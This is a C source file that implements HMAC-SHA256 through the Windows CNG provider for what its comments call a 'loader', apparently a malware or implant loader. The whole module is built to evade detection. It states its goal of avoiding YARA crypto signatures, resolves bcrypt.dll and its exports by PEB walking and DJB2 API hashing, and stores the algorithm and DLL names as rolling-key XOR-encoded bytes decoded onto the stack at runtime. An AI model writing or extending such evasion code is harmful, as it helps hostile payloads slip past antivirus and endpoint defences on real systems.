/*
 * cng_hmac.c — HMAC-SHA256 via the Windows CNG provider (R2)
 *
 * R2: the loader previously linked the self-contained hmac.c, which embeds the
 * 256-byte SHA-256 round-constant table (K256[64]) and the 8-word SHA-256 IV
 * as static constants — a known YARA target for crypto detection. This module
 * provides the SAME public API (hmac_sha256 / hmac_verify, declared in hmac.h)
 * but delegates HMAC-SHA256 entirely to the OS CNG provider using the
 * BCRYPT_ALG_HANDLE_HMAC_FLAG, so BCryptCreateHash takes the key directly and
 * BCryptHashData/BCryptFinishHash produce the tag. Zero crypto constants are
 * compiled into the binary.
 *
 * The self-contained hmac.c remains for the Linux encoder (encode2aes.c) and
 * the portable keyderive.c HKDF path on Linux — there it is guarded by
 * #ifndef _WIN32. On Windows this translation unit supplies the symbols.
 *
 * Resolution chain (matches cng.c):
 *   1. kernel32!LoadLibraryA (PEB walk + DJB2 hash) to map bcrypt.dll.
 *   2. Each BCrypt* export resolved from bcrypt.dll by DJB2 hash.
 * The "SHA256" algorithm wide string and "bcrypt.dll" ANSI string are
 * XOR-encoded (key 0x37) and decoded onto the stack at runtime, so no
 * plaintext crypto string appears in .rdata.
 *
 * hmac_verify is a trivial constant-time 32-byte compare (no crypto needed).
 */

#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include "hmac.h"
#include "cng.h"       /* N5: cng_get_bcrypt_base() — shared bcrypt.dll cache */
#include "peb.h"
#include "obfuscation.h"

/* ------------------------------------------------------------------ */
/* CNG type aliases (defined locally; we do NOT include <bcrypt.h>)    */
/* ------------------------------------------------------------------ */
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_HASH_HANDLE;

/* BCRYPT_ALG_HANDLE_HMAC_FLAG: tell CNG to run the provider in HMAC mode,
 * so BCryptCreateHash accepts the secret key and the hash is HMAC-SHA256
 * rather than plain SHA-256. */
#ifndef BCRYPT_ALG_HANDLE_HMAC_FLAG
#define BCRYPT_ALG_HANDLE_HMAC_FLAG  0x00000008UL
#endif

/* NTSTATUS success test (NTSTATUS is a signed LONG; success == >= 0). */
#ifndef NT_SUCCESS
#define NT_SUCCESS(s)  (((LONG)(s)) >= 0)
#endif

/* ------------------------------------------------------------------ */
/* BCrypt* function pointer typedefs (match the real CNG signatures)   */
/* ------------------------------------------------------------------ */
typedef LONG (WINAPI *PFN_BCryptOpenAlgorithmProvider)(
    BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId,
    LPCWSTR pszImplementation, ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptCreateHash)(
    BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_HASH_HANDLE *phHash,
    PUCHAR pbHashObject, ULONG cbHashObject,
    PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptHashData)(
    BCRYPT_HASH_HANDLE hHash, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptFinishHash)(
    BCRYPT_HASH_HANDLE hHash, PUCHAR pbOutput, ULONG cbOutput, ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptDestroyHash)(BCRYPT_HASH_HANDLE hHash);

typedef LONG (WINAPI *PFN_BCryptCloseAlgorithmProvider)(
    BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);

typedef HMODULE (WINAPI *PFN_LoadLibraryA)(LPCSTR);

/* ------------------------------------------------------------------ */
/* V1: multi-byte rolling-key XOR -- no plaintext in .rdata             */
/*                                                                     */
/* Strings are XOR-encoded with a short rolling key (one byte per key   */
/* position, wrapping). Decoded onto the stack at runtime by            */
/* xor_dec_w_mb() / xor_dec_mb().                                       */
/* ------------------------------------------------------------------ */

/* L"SHA256" -- 6 wide chars (UTF-16LE ^ rolling key) */
static const uint8_t enc_key_sha256[4] = { 0xfc, 0x83, 0xe4, 0x0a };
static const uint8_t enc_sha256_alg[] = {
    0xaf,0x83, 0xac,0x0a, 0xbd,0x83, 0xd6,0x0a, 0xc9,0x83, 0xd2,0x0a
};
#define SHA256_ALG_LEN 6

/* "bcrypt.dll" (ANSI) -- 10 bytes (^ rolling key). Unused here since N5
 * routes bcrypt.dll loading through cng_get_bcrypt_base() in cng.c; kept
 * for symmetry and dropped by --gc-sections. */
static const uint8_t enc_key_bcrypt[6] = { 0xea, 0xdb, 0x4a, 0x2f, 0x95, 0x79 };
static const uint8_t enc_bcrypt_dll[] = {
    0x88, 0xb8, 0x38, 0x56, 0xe5, 0x0d, 0xc4, 0xbf, 0x26, 0x43
};
#define BCRYPT_DLL_LEN 10

/* ------------------------------------------------------------------ */
/* hmac_sha256 -- HMAC-SHA256(key, msg) -> out[32] via CNG             */
/*                                                                     */
/* key:      HMAC secret (any length; CNG handles the RFC 2104 key      */
/*           hashing/zero-padding internally when BCRYPT_ALG_HANDLE_    */
/*           HMAC_FLAG is set).                                        */
/* key_len:  length of key in bytes.                                   */
/* msg:      message to authenticate (may be NULL only if msg_len==0). */
/* msg_len:  length of msg in bytes (may be 0).                        */
/* out:      receives the 32-byte HMAC-SHA256 tag.                     */
/* Returns:  0 on success, non-zero on bad args / CNG failure.         */
/* ------------------------------------------------------------------ */
int hmac_sha256(const uint8_t *key, size_t key_len,
                const uint8_t *msg, size_t msg_len,
                uint8_t out[32])
{
    if (!key || !out) return 1;
    /* msg may be NULL only when msg_len == 0; treat as empty. */
    if (!msg && msg_len != 0) return 1;

    /* ---- N5: resolve bcrypt.dll via the shared cached path (cng.c) ---- */
    HMODULE bcrypt_base = cng_get_bcrypt_base();
    if (!bcrypt_base) {
        DBG_PRINTF("[cng_hmac] failed to load bcrypt.dll\n");
        return 1;
    }

    /* ---- Resolve the six BCrypt* HMAC exports by DJB2 hash ---- */
    PFN_BCryptOpenAlgorithmProvider  pOpenAlg =
        (PFN_BCryptOpenAlgorithmProvider)peb_find_export(
            bcrypt_base, HASH_BCryptOpenAlgorithmProvider);
    PFN_BCryptCreateHash             pCreateHash =
        (PFN_BCryptCreateHash)peb_find_export(
            bcrypt_base, HASH_BCryptCreateHash);
    PFN_BCryptHashData               pHashData =
        (PFN_BCryptHashData)peb_find_export(
            bcrypt_base, HASH_BCryptHashData);
    PFN_BCryptFinishHash             pFinishHash =
        (PFN_BCryptFinishHash)peb_find_export(
            bcrypt_base, HASH_BCryptFinishHash);
    PFN_BCryptDestroyHash            pDestroyHash =
        (PFN_BCryptDestroyHash)peb_find_export(
            bcrypt_base, HASH_BCryptDestroyHash);
    PFN_BCryptCloseAlgorithmProvider pCloseAlg =
        (PFN_BCryptCloseAlgorithmProvider)peb_find_export(
            bcrypt_base, HASH_BCryptCloseAlgorithmProvider);

    if (!pOpenAlg || !pCreateHash || !pHashData || !pFinishHash ||
        !pDestroyHash || !pCloseAlg) {
        DBG_PRINTF("[cng_hmac] missing BCrypt export\n");
        return 1;
    }

    /* ---- State for cleanup ---- */
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    LONG status;

    /* ---- Open the "SHA256" algorithm provider in HMAC mode ---- */
    wchar_t alg_buf[SHA256_ALG_LEN + 1];
    wchar_t *alg_name = xor_dec_w_mb(alg_buf, enc_sha256_alg, SHA256_ALG_LEN, enc_key_sha256, 4);

    status = pOpenAlg(&hAlg, alg_name, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    secure_zero(alg_buf, sizeof(alg_buf));

    if (!NT_SUCCESS(status)) {
        DBG_PRINTF("[cng_hmac] BCryptOpenAlgorithmProvider(SHA256,HMAC) failed: 0x%lX\n",
                   (unsigned long)status);
        return 1;
    }

    /* ---- Create the HMAC hash handle with the secret key ---- *
     *
     * With BCRYPT_ALG_HANDLE_HMAC_FLAG, pbSecret/cbSecret carry the HMAC key
     * and CNG implements RFC 2104 (key hashing if > block size, zero-pad to
     * block size, ipad/opad) internally. Pass pbHashObject=NULL / cbHashObject=0
     * to let CNG allocate the hash object internally (we only destroy the
     * handle). */
    status = pCreateHash(hAlg, &hHash, NULL, 0,
                         (PUCHAR)key, (ULONG)key_len, 0);
    if (!NT_SUCCESS(status)) {
        DBG_PRINTF("[cng_hmac] BCryptCreateHash failed: 0x%lX\n",
                   (unsigned long)status);
        pCloseAlg(hAlg, 0);
        return 1;
    }

    /* ---- Hash the message (may be empty) ---- */
    if (msg_len > 0) {
        status = pHashData(hHash, (PUCHAR)msg, (ULONG)msg_len, 0);
        if (!NT_SUCCESS(status)) {
            DBG_PRINTF("[cng_hmac] BCryptHashData failed: 0x%lX\n",
                       (unsigned long)status);
            pDestroyHash(hHash);
            pCloseAlg(hAlg, 0);
            return 1;
        }
    }

    /* ---- Finish: write the 32-byte tag ---- */
    status = pFinishHash(hHash, out, 32, 0);
    if (!NT_SUCCESS(status)) {
        DBG_PRINTF("[cng_hmac] BCryptFinishHash failed: 0x%lX\n",
                   (unsigned long)status);
        pDestroyHash(hHash);
        pCloseAlg(hAlg, 0);
        return 1;
    }

    /* ---- Cleanup: destroy hash handle, close provider ---- */
    pDestroyHash(hHash);
    pCloseAlg(hAlg, 0);
    return 0;
}

/* ------------------------------------------------------------------ */
/* hmac_verify -- constant-time 32-byte tag compare                    */
/*                                                                     */
/* Identical to the self-contained hmac.c implementation. Returns 0 if */
/* the tags are equal, non-zero otherwise. Constant-time so a caller    */
/* cannot use timing to learn how many leading bytes matched.          */
/* ------------------------------------------------------------------ */
int hmac_verify(const uint8_t *a, const uint8_t *b)
{
    uint8_t r = 0;
    for (int i = 0; i < 32; i++) r |= a[i] ^ b[i];
    return r;  /* 0 == equal */
}